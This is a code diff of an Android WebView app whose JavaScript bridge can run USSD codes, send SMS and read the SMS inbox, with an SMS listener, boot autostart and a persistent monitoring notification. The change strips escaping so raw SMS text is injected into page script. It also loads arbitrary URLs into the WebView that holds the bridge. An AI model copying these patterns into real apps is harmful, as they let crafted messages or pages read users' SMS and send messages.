@@ -5,7 +5,6 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
-import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -16,11 +15,10 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
-import android.os.IBinder;
 import android.os.Looper;
 import android.telephony.SmsManager;
-import android.telephony.SmsMessage;
 import android.telephony.TelephonyManager;
+import android.util.Log;
 import android.webkit.JavascriptInterface;
 import android.webkit.WebResourceRequest;
 import android.webkit.WebSettings;
@@ -28,44 +26,45 @@ import android.webkit.WebView;
 import android.webkit.WebViewClient;
 
 import androidx.annotation.NonNull;
-import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
-import androidx.core.content.ContextCompat;
 
 public class MainActivity extends AppCompatActivity {
 
     private WebView webView;
-    private BroadcastReceiver smsReceiver;
+
     private static final int REQUEST_ALL_PERMISSIONS = 1;
-    private static final String FOREGROUND_CHANNEL_ID = "foreground_channel";
-    private static final int FOREGROUND_NOTIFICATION_ID = 101;
+    private static final String CHANNEL_ID = "foreground_channel";
+    private static final int NOTIFICATION_ID = 101;
+
     private String pendingUSSDCode;
 
-    /* =========================
-       ACTIVITY ONCREATE
-       ========================= */
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
         webView = findViewById(R.id.webview);
-        WebSettings s = webView.getSettings();
-        s.setJavaScriptEnabled(true);
-        s.setDomStorageEnabled(true);
+
+        WebSettings settings = webView.getSettings();
+        settings.setJavaScriptEnabled(true);
+        settings.setDomStorageEnabled(true);
+        settings.setAllowFileAccess(true);
+        settings.setAllowContentAccess(true);
+        settings.setLoadWithOverviewMode(true);
+        settings.setUseWideViewPort(true);
 
         webView.setWebViewClient(new WebViewClient() {
             @Override
-            public boolean shouldOverrideUrlLoading(WebView v, WebResourceRequest r) {
-                v.loadUrl(r.getUrl().toString());
+            public boolean shouldOverrideUrlLoading(WebView view, String url) {
+                view.loadUrl(url);
                 return true;
             }
 
             @Override
-            public boolean shouldOverrideUrlLoading(WebView v, String url) {
-                v.loadUrl(url);
+            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
+                view.loadUrl(request.getUrl().toString());
                 return true;
             }
         });
@@ -73,14 +72,20 @@ public class MainActivity extends AppCompatActivity {
         webView.addJavascriptInterface(new JSBridge(), "AndroidUSSD");
         webView.loadUrl("file:///android_asset/index.html");
 
+        // Request permissions and start foreground notification
         requestAllPermissions();
-        startForegroundServiceIfNeeded();
-        setupSmsReceiver();
+        startForegroundNotification();
+
+        // Listen for SMS received
+        registerReceiver(smsReceiver, new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
+
+        // Listen for general notifications (optional)
+        registerReceiver(notificationReceiver, new IntentFilter("com.example.ussdwebview.NOTIFICATION_LISTENER"));
     }
 
-    /* =========================
-       JS Bridge
-       ========================= */
+    /* =======================
+       JavaScript Bridge
+       ======================= */
     private class JSBridge {
 
         @JavascriptInterface
@@ -89,8 +94,8 @@ public class MainActivity extends AppCompatActivity {
         }
 
         @JavascriptInterface
-        public void sendSms(String phone, String msg) {
-            runOnUiThread(() -> executeSendSMS(phone, msg));
+        public void sendSms(String phone, String message) {
+            runOnUiThread(() -> executeSendSMS(phone, message));
         }
 
         @JavascriptInterface
@@ -99,269 +104,270 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    /* =========================
+    /* =======================
        USSD
-       ========================= */
+       ======================= */
     private void executeUSSD(String code) {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
-            sendResultToWeb("USSD requires Android 8.0+");
+            sendResultToWeb("USSD supported on Android 8.0+ only");
+            return;
+        }
+
+        if (!hasAllPermissions()) {
+            pendingUSSDCode = code;
+            requestAllPermissions();
             return;
         }
 
         TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-        if (tm == null) return;
-
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE)
-                != PackageManager.PERMISSION_GRANTED ||
-            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
-                != PackageManager.PERMISSION_GRANTED) {
-            pendingUSSDCode = code;
-            ActivityCompat.requestPermissions(this, new String[]{
-                    Manifest.permission.CALL_PHONE,
-                    Manifest.permission.READ_PHONE_STATE
-            }, REQUEST_ALL_PERMISSIONS);
+        if (tm == null) {
+            sendResultToWeb("Telephony service unavailable");
             return;
         }
 
         tm.sendUssdRequest(code, new TelephonyManager.UssdResponseCallback() {
             @Override
-            public void onReceiveUssdResponse(TelephonyManager t, String r, CharSequence res) {
-                sendResultToWeb(res.toString());
+            public void onReceiveUssdResponse(
+                    TelephonyManager telephonyManager,
+                    String request,
+                    CharSequence response) {
+                sendResultToWeb(response.toString());
             }
 
             @Override
-            public void onReceiveUssdResponseFailed(TelephonyManager t, String r, int f) {
-                sendResultToWeb("USSD failed: " + f);
+            public void onReceiveUssdResponseFailed(
+                    TelephonyManager telephonyManager,
+                    String request,
+                    int failureCode) {
+                sendResultToWeb("USSD failed: " + failureCode);
             }
         }, new Handler(Looper.getMainLooper()));
     }
 
-    /* =========================
+    /* =======================
        SEND SMS
-       ========================= */
-    private void executeSendSMS(String phone, String msg) {
+       ======================= */
+    private void executeSendSMS(String phone, String message) {
+        if (!hasSmsPermissions()) {
+            requestAllPermissions();
+            return;
+        }
+
         try {
-            SmsManager.getDefault().sendTextMessage(phone, null, msg, null, null);
-            sendResultToWeb("SMS sent to " + phone);
+            SmsManager.getDefault().sendTextMessage(phone, null, message, null, null);
+            sendResultToWeb("SMS sent successfully");
         } catch (Exception e) {
-            sendResultToWeb("SMS send error: " + e.getMessage());
+            sendResultToWeb("SMS failed: " + e.getMessage());
         }
     }
 
-    /* =========================
-       READ SMS WITH IDS (JSON)
-       ========================= */
+    /* =======================
+       READ SMS
+       ======================= */
     private void executeReadSMS() {
-        Cursor c = getContentResolver().query(
-                Uri.parse("content://sms/inbox"),
-                null, null, null,
+        if (!hasSmsPermissions()) {
+            requestAllPermissions();
+            return;
+        }
+
+        Uri inboxUri = Uri.parse("content://sms/inbox");
+        Cursor cursor = getContentResolver().query(
+                inboxUri,
+                null,
+                null,
+                null,
                 "date DESC"
         );
-        if (c == null) return;
 
-        StringBuilder sb = new StringBuilder();
-        sb.append("["); // Start JSON array
+        if (cursor == null) {
+            sendResultToWeb("Failed to read SMS");
+            return;
+        }
+
+        StringBuilder smsJson = new StringBuilder("[");
         boolean first = true;
 
-        while (c.moveToNext()) {
-            if (!first) sb.append(",");
+        while (cursor.moveToNext()) {
+            String id = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
+            String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+            String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
+
+            if (!first) smsJson.append(",");
             first = false;
 
-            String id = c.getString(c.getColumnIndexOrThrow("_id"));
-            String from = c.getString(c.getColumnIndexOrThrow("address"));
-            String body = c.getString(c.getColumnIndexOrThrow("body"));
-
-            sb.append("{")
-              .append("\"id\":\"").append(id).append("\",")
-              .append("\"from\":\"").append(from.replace("\"","\\\"")).append("\",")
-              .append("\"body\":\"").append(body.replace("\"","\\\"")).append("\"")
-              .append("}");
+            smsJson.append("{")
+                    .append("\"id\":\"").append(id).append("\",")
+                    .append("\"from\":\"").append(address).append("\",")
+                    .append("\"body\":\"").append(body).append("\"")
+                    .append("}");
         }
-        c.close();
-        sb.append("]"); // End JSON array
 
-        final String safeMsg = sb.toString()
-                                 .replace("\\", "\\\\")
-                                 .replace("'", "\\'")
-                                 .replace("\n", "\\n");
+        cursor.close();
+        smsJson.append("]");
 
         webView.post(() -> webView.evaluateJavascript(
-                "if(window.onReadSms) onReadSms(" + safeMsg + ");",
+                "if(window.onReadSms) onReadSms(" + smsJson + ");",
                 null
         ));
     }
 
-    /* =========================
-       SEND DATA TO WEB
-       ========================= */
-    private void sendResultToWeb(String msg) {
-        final String safeMsg = msg.replace("\\", "\\\\")
-                                  .replace("'", "\\'")
-                                  .replace("\n", "\\n");
-        webView.post(() -> webView.evaluateJavascript(
-                "if(window.showResult) showResult('" + safeMsg + "');",
-                null
-        ));
+    /* =======================
+       Permissions
+       ======================= */
+    private boolean hasSmsPermissions() {
+        return ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED &&
+                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
     }
 
-    /* =========================
-       SMS RECEIVER (foreground & notifications)
-       ========================= */
-    private void setupSmsReceiver() {
-        smsReceiver = new BroadcastReceiver() {
-            @Override
-            public void onReceive(Context context, Intent intent) {
-                if (intent.getAction() == null || !intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
+    private boolean hasAllPermissions() {
+        return ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED &&
+                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED &&
+                hasSmsPermissions();
+    }
+
+    private void requestAllPermissions() {
+        ActivityCompat.requestPermissions(
+                this,
+                new String[]{
+                        Manifest.permission.CALL_PHONE,
+                        Manifest.permission.READ_PHONE_STATE,
+                        Manifest.permission.SEND_SMS,
+                        Manifest.permission.READ_SMS,
+                        Manifest.permission.RECEIVE_BOOT_COMPLETED
+                },
+                REQUEST_ALL_PERMISSIONS
+        );
+    }
+
+    @Override
+    public void onRequestPermissionsResult(
+            int requestCode,
+            @NonNull String[] permissions,
+            @NonNull int[] grantResults) {
+
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+
+        if (requestCode == REQUEST_ALL_PERMISSIONS) {
+            for (int result : grantResults) {
+                if (result != PackageManager.PERMISSION_GRANTED) {
+                    sendResultToWeb("Permission denied");
                     return;
-
-                Intent serviceIntent = new Intent(context, SmsForegroundService.class);
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-                    context.startForegroundService(serviceIntent);
-                else
-                    context.startService(serviceIntent);
-
-                Object[] pdus = (Object[]) intent.getExtras().get("pdus");
-                if (pdus == null) return;
-
-                for (Object p : pdus) {
-                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) p);
-                    String from = sms.getOriginatingAddress();
-                    String msg = sms.getMessageBody();
-                    showSmsNotification(context, from, msg);
                 }
             }
-        };
+
+            if (pendingUSSDCode != null) {
+                executeUSSD(pendingUSSDCode);
+                pendingUSSDCode = null;
+            }
+        }
     }
 
-    private void showSmsNotification(Context context, String from, String msg) {
-        NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+    /* =======================
+       WebView callback
+       ======================= */
+    private void sendResultToWeb(String message) {
+        String safeMessage = message
+                .replace("\\", "\\\\")
+                .replace("'", "\\'")
+                .replace("\n", "\\n");
+
+        webView.post(() -> webView.evaluateJavascript(
+                "showResult('" + safeMessage + "')",
+                null
+        ));
+    }
+
+    /* =======================
+       Foreground Notification
+       ======================= */
+    private void startForegroundNotification() {
+        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel ch = new NotificationChannel("sms_channel", "SMS Alert", NotificationManager.IMPORTANCE_HIGH);
+            NotificationChannel ch = new NotificationChannel(
+                    CHANNEL_ID,
+                    "Foreground Service",
+                    NotificationManager.IMPORTANCE_LOW
+            );
             nm.createNotificationChannel(ch);
         }
 
-        Intent intent = new Intent(context, MainActivity.class);
-        PendingIntent pi = PendingIntent.getActivity(context, 0, intent,
-                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+        Intent intent = new Intent(this, MainActivity.class);
+        intent.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+        PendingIntent pi = PendingIntent.getActivity(
+                this,
+                0,
+                intent,
+                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
+        );
 
-        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, "sms_channel")
+        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle("Real Time Data")
+                .setContentText("Erandix Monitoring")
                 .setSmallIcon(R.drawable.app_icon)
-                .setContentTitle("New SMS from " + from)
-                .setContentText(msg)
+                .setOngoing(true)
                 .setContentIntent(pi)
-                .setAutoCancel(true)
-                .setPriority(NotificationCompat.PRIORITY_HIGH);
+                .build();
 
-        nm.notify((int) System.currentTimeMillis(), builder.build());
+        nm.notify(NOTIFICATION_ID, notification);
     }
 
-    /* =========================
-       FOREGROUND SERVICE
-       ========================= */
-    public static class SmsForegroundService extends Service {
-
+    /* =======================
+       SMS Receiver
+       ======================= */
+    private final BroadcastReceiver smsReceiver = new BroadcastReceiver() {
         @Override
-        public void onCreate() {
-            super.onCreate();
-            startForegroundServiceNotification();
+        public void onReceive(Context context, Intent intent) {
+
+            // On SMS receive, reload all SMS in WebView
+            executeReadSMS();
+
+            // Optional: bring app to foreground
+            Intent i = new Intent(context, MainActivity.class);
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+            context.startActivity(i);
         }
+    };
 
-        private void startForegroundServiceNotification() {
-            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                NotificationChannel ch = new NotificationChannel(FOREGROUND_CHANNEL_ID, "Foreground Service", NotificationManager.IMPORTANCE_LOW);
-                nm.createNotificationChannel(ch);
-            }
-
-            Intent intent = new Intent(this, MainActivity.class);
-            PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
-                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
-
-            Notification n = new NotificationCompat.Builder(this, FOREGROUND_CHANNEL_ID)
-                    .setContentTitle("Real Time Data")
-                    .setContentText("Erandix Monitoring")
-                    .setSmallIcon(R.drawable.app_icon)
-                    .setContentIntent(pi)
-                    .setOngoing(true)
-                    .build();
-
-            startForeground(FOREGROUND_NOTIFICATION_ID, n);
+    /* =======================
+       Notification Listener Receiver
+       ======================= */
+    private final BroadcastReceiver notificationReceiver = new BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            // Example: Reload WebView on notification
+            webView.post(() -> webView.reload());
         }
+    };
 
-        @Override
-        public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
-
-        @Nullable
-        @Override
-        public IBinder onBind(Intent intent) { return null; }
+    @Override
+    public void onBackPressed() {
+        if (webView.canGoBack()) {
+            webView.goBack();
+        } else {
+            super.onBackPressed();
+        }
     }
 
-    /* =========================
-       BOOT RECEIVER
-       ========================= */
+    /* =======================
+       Boot Receiver (Auto Start)
+       ======================= */
     public static class BootReceiver extends BroadcastReceiver {
         @Override
         public void onReceive(Context context, Intent intent) {
             if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
-                Intent serviceIntent = new Intent(context, SmsForegroundService.class);
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-                    context.startForegroundService(serviceIntent);
-                else
-                    context.startService(serviceIntent);
+                Intent i = new Intent(context, MainActivity.class);
+                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(i);
             }
         }
     }
 
-    /* =========================
-       ACTIVITY LIFECYCLE
-       ========================= */
     @Override
-    protected void onResume() {
-        super.onResume();
-        registerReceiver(smsReceiver, new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
-    }
-
-    @Override
-    protected void onPause() {
-        super.onPause();
-        unregisterReceiver(smsReceiver);
-    }
-
-    private void startForegroundServiceIfNeeded() {
-        Intent serviceIntent = new Intent(this, SmsForegroundService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-            ContextCompat.startForegroundService(this, serviceIntent);
-        else
-            startService(serviceIntent);
-    }
-
-    private void requestAllPermissions() {
-        ActivityCompat.requestPermissions(this, new String[]{
-                Manifest.permission.RECEIVE_SMS,
-                Manifest.permission.READ_SMS,
-                Manifest.permission.SEND_SMS,
-                Manifest.permission.CALL_PHONE,
-                Manifest.permission.READ_PHONE_STATE,
-                Manifest.permission.FOREGROUND_SERVICE
-        }, REQUEST_ALL_PERMISSIONS);
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
-                                           @NonNull int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == REQUEST_ALL_PERMISSIONS && pendingUSSDCode != null &&
-            grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-            executeUSSD(pendingUSSDCode);
-            pendingUSSDCode = null;
-        }
-    }
-
-    @Override
-    public void onBackPressed() {
-        if (webView.canGoBack())
-            webView.goBack();
-        else
-            super.onBackPressed();
+    protected void onDestroy() {
+        super.onDestroy();
+        try {
+            unregisterReceiver(smsReceiver);
+            unregisterReceiver(notificationReceiver);
+        } catch (Exception ignored) {}
     }
 }
